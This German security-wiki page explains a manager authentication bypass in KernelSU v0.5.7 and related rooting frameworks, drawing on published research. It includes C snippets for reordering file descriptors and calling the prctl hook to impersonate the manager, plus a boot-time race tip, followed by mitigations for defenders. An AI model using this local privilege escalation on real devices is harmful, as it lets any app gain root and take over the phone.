# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting Frameworks wie KernelSU, APatch, SKRoot und Magisk patchen häufig den Linux-/Android-Kernel und stellen einer unprivilegierten User-Space-"Manager"-App über einen gehookten Syscall privilegierte Funktionen zur Verfügung. Wenn der Manager-Authentifizierungsschritt fehlerhaft ist, kann jede lokale App diesen Kanal erreichen und auf bereits gerooteten Geräten ihre Privilegien erweitern.

Diese Seite abstrahiert die in öffentlichen Research-Arbeiten aufgedeckten Techniken und Fallstricke (insbesondere Zimperiums Analyse von KernelSU v0.5.7), um sowohl Red- als auch Blue-Teams zu helfen, Angriffsflächen, Exploitation-Primitives und robuste Mitigations zu verstehen.<sup>[[1]](#references)</sup>

---
## Architekturmuster: Syscall-gehookter Manager-Kanal

- Kernel module/patch hookt einen Syscall (üblicherweise prctl), um "Befehle" aus dem Userspace zu empfangen.
- Das Protokoll besteht typischerweise aus: magic_value, command_id, arg_ptr/len ...
- Eine Userspace-Manager-App authentifiziert sich zuerst (z. B. CMD_BECOME_MANAGER). Sobald der Kernel den Caller als vertrauenswürdigen Manager markiert, werden privilegierte Befehle akzeptiert:
- Root an den Caller vergeben (z. B. CMD_GRANT_ROOT)
- Allowlists/Denylists für su verwalten
- SELinux-Policy anpassen (z. B. CMD_SET_SEPOLICY)
- Version/Konfiguration abfragen
- Da jede App Syscalls aufrufen kann, ist die Korrektheit der Manager-Authentifizierung entscheidend.

Beispiel (KernelSU-Design):
- Gehookter Syscall: prctl
- Magic value zum Umleiten an den KernelSU-Handler: 0xDEADBEEF
- Zu den Befehlen gehören: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT usw.

---
## KernelSU-v0.5.7-Authentifizierungsablauf (wie implementiert)

Wenn Userspace prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) aufruft, überprüft KernelSU:

1) Pfadpräfix-Prüfung
- Der angegebene Pfad muss mit einem für die Caller-UID erwarteten Präfix beginnen, z. B. /data/data/<pkg> oder /data/user/<id>/<pkg>.
- Referenz: Pfadpräfix-Logik in core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Eigentümerprüfung
- Der Pfad muss der Caller-UID gehören.
- Referenz: Eigentümerlogik in core_hook.c (v.0.5.7).<sup>[[2]](#references)</sup>

3) APK-Signaturprüfung durch Scannen der FD-Tabelle
- Die offenen File Descriptors (FDs) des aufrufenden Prozesses werden iteriert.
- Die erste Datei, deren Pfad zu /data/app/*/base.apk passt, wird ausgewählt.
- Die APK-v2-Signatur wird geparst und gegen das offizielle Manager-Zertifikat verifiziert.
- Referenzen: manager.c (Iteration über FDs), apk_sign.c (APK-v2-Verifikation).<sup>[[3]](#references)[[4]](#references)</sup>

Wenn alle Prüfungen erfolgreich sind, cached der Kernel die UID des Managers vorübergehend und akzeptiert privilegierte Befehle von dieser UID, bis sie zurückgesetzt wird.

---
## Vulnerability Class: Vertrauen in die „erste passende APK“ bei der FD-Iteration

Wenn die Signaturprüfung an die „erste passende /data/app/*/base.apk“ gebunden ist, die in der FD-Tabelle des Prozesses gefunden wird, wird nicht tatsächlich das eigene Package des Callers verifiziert. Ein Angreifer kann eine korrekt signierte APK (die des echten Managers) so vorab platzieren, dass sie in der FD-Liste früher erscheint als die eigene base.apk.

Dieses Trust-by-Indirection ermöglicht es einer unprivilegierten App, den Manager zu imitieren, ohne den Signing Key des Managers zu besitzen.<sup>[[1]](#references)</sup>

Ausgenutzte Schlüsseleigenschaften:<sup>[[1]](#references)</sup>
- Der FD-Scan bindet nicht an die Package-Identität des Callers; er führt lediglich ein Pattern-Matching von Pfad-Strings durch.
- open() gibt den niedrigsten verfügbaren FD zurück. Durch das vorherige Schließen niedriger nummerierter FDs kann ein Angreifer die Reihenfolge kontrollieren.
- Der Filter prüft nur, ob der Pfad zu /data/app/*/base.apk passt – nicht, ob er dem installierten Package des Callers entspricht.

---
## Voraussetzungen für den Angriff

- Das Gerät ist bereits mit einem verwundbaren Rooting Framework gerootet (z. B. KernelSU v0.5.7).
- Der Angreifer kann beliebigen unprivilegierten Code lokal ausführen (Android-App-Prozess).
- Der echte Manager hat sich noch nicht authentifiziert (z. B. direkt nach einem Reboot). Einige Frameworks cachen die Manager-UID nach erfolgreicher Authentifizierung; der Angreifer muss das Race gewinnen.<sup>[[1]](#references)</sup>

---
## Exploitation-Überblick (KernelSU v0.5.7)

Schritte auf hoher Ebene:<sup>[[1]](#references)[[9]](#references)</sup>
1) Einen gültigen Pfad zum eigenen App-Datenverzeichnis erstellen, um die Präfix- und Eigentümerprüfungen zu erfüllen.
2) Sicherstellen, dass eine echte KernelSU-Manager-base.apk auf einem niedriger nummerierten FD als die eigene base.apk geöffnet wird.
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) aufrufen, um die Prüfungen zu bestehen.
4) Privilegierte Befehle wie CMD_GRANT_ROOT, CMD_ALLOW_SU und CMD_SET_SEPOLICY ausführen, um die Elevation dauerhaft zu machen.

Praktische Hinweise zu Schritt 2 (FD-Reihenfolge):<sup>[[1]](#references)</sup>
- Den FD des eigenen /data/app/*/base.apk im Prozess durch das Durchlaufen der /proc/self/fd-Symlinks identifizieren.
- Einen niedrigen FD (z. B. stdin, fd 0) schließen und zuerst die legitime Manager-APK öffnen, sodass sie fd 0 (oder einen anderen Index unterhalb des eigenen base.apk-FD) belegt.
- Die legitime Manager-APK mit der eigenen App bündeln, damit ihr Pfad dem naiven Filter des Kernels entspricht. Sie kann beispielsweise unter einem Subpfad abgelegt werden, der zu /data/app/*/base.apk passt.

Beispiel-Code-Snippets (Android/Linux, nur zur Veranschaulichung):

Offene FDs enumerieren, um base.apk-Einträge zu finden:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Erzwinge, dass ein FD mit niedrigerer Nummer auf die legitime Manager-APK zeigt:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Manager-Authentifizierung über prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Nach erfolgreicher Ausführung privilegierter Befehle (Beispiele):
- CMD_GRANT_ROOT: aktuellen Prozess zu root hochstufen
- CMD_ALLOW_SU: dein Package/deine UID zur Allowlist für persistentes su hinzufügen
- CMD_SET_SEPOLICY: die SELinux policy anpassen, soweit vom Framework unterstützt

Race-/Persistenz-Tipp:
- Einen BOOT_COMPLETED-Receiver im AndroidManifest (RECEIVE_BOOT_COMPLETED) registrieren, um nach einem Reboot früh zu starten und die Authentifizierung vor dem echten Manager zu versuchen.<sup>[[1]](#references)</sup>

---
## Hinweise zur Erkennung und Abwehr

Für Framework-Entwickler:
- Die Authentifizierung an das Package/die UID des Aufrufers binden, nicht an beliebige FDs:
- Das Package des Aufrufers anhand seiner UID auflösen und es anhand der Signatur des installierten Packages (über den PackageManager) verifizieren, statt FDs zu durchsuchen.
- Wenn ausschließlich der Kernel verwendet wird, eine stabile Identität des Aufrufers (Task-Credentials) nutzen und gegen eine stabile, von init/einem Userspace-Helfer verwaltete Quelle der Wahrheit validieren, nicht gegen Prozess-FDs.
- Pfadpräfix-Prüfungen nicht als Identität verwenden; sie können vom Aufrufer trivial erfüllt werden.
- Eine auf Nonces basierende Challenge-Response über den Kanal verwenden und jede zwischengespeicherte Manager-Identität beim Booten oder bei wichtigen Ereignissen löschen.
- Wenn möglich Binder-basierte authentifizierte IPC in Betracht ziehen, statt generische Syscalls zu überladen.

Für Defender/Blue Team:
- Das Vorhandensein von Rooting-Frameworks und Manager-Prozessen erkennen; auf prctl-Aufrufe mit verdächtigen Magic Constants (z. B. 0xDEADBEEF) überwachen, sofern Kernel-Telemetrie verfügbar ist.
- In verwalteten Geräteflotten Boot-Receiver aus nicht vertrauenswürdigen Packages blockieren oder melden, die nach dem Boot schnell privilegierte Manager-Befehle versuchen.
- Sicherstellen, dass die Geräte auf gepatchte Framework-Versionen aktualisiert sind; zwischengespeicherte Manager-IDs bei einem Update ungültig machen.

Einschränkungen des Angriffs:
- Betrifft nur Geräte, die bereits mit einem verwundbaren Framework gerootet wurden.
- Erfordert typischerweise einen Reboot-/Race-Zeitraum, bevor der legitime Manager authentifiziert wird (einige Frameworks speichern die Manager-UID bis zum Zurücksetzen zwischen).

---
## Verwandte Hinweise zu verschiedenen Frameworks

- Password-basierte Authentifizierung (z. B. historische APatch-/SKRoot-Builds) kann schwach sein, wenn Passwords erratbar oder per Brute-Force angreifbar sind oder die Validierungen fehlerhaft sind.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package-/Signatur-basierte Authentifizierung (z. B. KernelSU) ist prinzipiell stärker, muss jedoch an den tatsächlichen Aufrufer gebunden werden, nicht an indirekte Artefakte wie FD-Scans.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) zeigte, dass selbst ausgereifte Ökosysteme für Identity-Spoofing anfällig sein können, was zu Code Execution mit root im Manager-Kontext führt.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
